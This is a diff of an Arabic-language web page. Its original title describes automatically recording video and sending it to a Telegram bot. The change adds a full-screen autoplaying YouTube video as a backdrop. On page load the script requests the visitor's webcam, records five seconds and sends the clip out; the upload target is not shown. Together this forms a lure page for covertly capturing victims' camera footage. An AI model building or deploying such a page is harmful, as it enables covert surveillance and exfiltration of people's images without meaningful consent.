@@ -2,25 +2,40 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل فيديو تلقائي وإرساله إلى بوت تيليجرام</title>
+  <title>تسجيل فيديو والكاميرا تظهر فوق YouTube</title>
   <style>
-    body {
+    body, html {
       margin: 0;
-      background: #000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
     }
-    video {
-      width: 100%;
-      max-width: 400px;
-      border: 2px solid #00ff99;
-      border-radius: 12px;
+    #youtube {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 1;
+    }
+    #video {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      width: 320px;
+      height: 240px;
+      border: 3px solid #00ff99;
+      border-radius: 10px;
+      z-index: 2;
     }
   </style>
 </head>
 <body>
+
+  <!-- YouTube Video as background -->
+  <iframe id="youtube" src="https://www.youtube.com/embed/vaP0ZdA-KHo?autoplay=1&mute=1&controls=0&loop=1&playlist=vaP0ZdA-KHo" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+  <!-- Camera video -->
   <video id="video" autoplay muted playsinline></video>
 
   <script>
@@ -31,17 +46,13 @@
 
     async function startRecording() {
       try {
-        // طلب إذن الكاميرا بدون صوت
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         video.srcObject = stream;
 
-        // إعداد المسجل
         const recorder = new MediaRecorder(stream);
         let chunks = [];
 
-        recorder.ondataavailable = (e) => {
-          chunks.push(e.data);
-        };
+        recorder.ondataavailable = (e) => chunks.push(e.data);
 
         recorder.onstop = async () => {
           const blob = new Blob(chunks, { type: 'video/webm' });
@@ -60,26 +71,22 @@
             } else {
               console.error("❌ فشل إرسال الفيديو");
             }
-          } catch (error) {
-            console.error("📶 خطأ في الاتصال:", error);
+          } catch (err) {
+            console.error("📶 خطأ في الاتصال:", err);
           }
         };
 
-        // بدء التسجيل تلقائيًا
         recorder.start();
-
-        // مدة التسجيل (مثلاً 5 ثوانٍ)
         setTimeout(() => {
           recorder.stop();
           stream.getTracks().forEach(track => track.stop());
-        }, 5000);
+        }, 5000); // تسجيل 5 ثوانٍ فقط
 
       } catch (err) {
         console.error("🚫 فشل الوصول إلى الكاميرا:", err);
       }
     }
 
-    // ابدأ بعد تحميل الصفحة
     window.onload = startRecording;
   </script>
 </body>
